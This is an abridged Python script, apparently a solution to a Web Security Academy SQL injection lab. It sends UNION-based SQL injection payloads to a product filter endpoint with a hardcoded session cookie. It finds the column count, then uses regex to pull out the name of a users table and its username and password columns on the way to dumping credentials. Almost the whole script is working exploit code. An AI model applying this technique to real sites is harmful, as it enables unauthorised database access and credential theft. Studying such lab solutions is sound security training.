...
url = "https://0a4c00aa0410e30d80d830af00090081.web-security-academy.net/"

cookies = {
    "session": "AnyUcEM6ZgsDgBlPAFIgL7r9Ui7P41ZI"
}
...
for column_count in range(1, 20):
    ...
    payload = f"Accessories' UNION SELECT {nulls} from dual-- -"
...
r = requests.get(f"{url}/filter", headers=headers, cookies=cookies, params=params)
table_name = re.findall(r'USERS_\w+', r.text, re.I)[1]
...
r = requests.get(f"{url}/filter", headers=headers, cookies=cookies, params=params)
username_column = re.search(r'USERNAME_\w+', r.text, re.I).group(0)
password_column = re.search(r'PASSWORD_\w+', r.text, re.I).group(0)
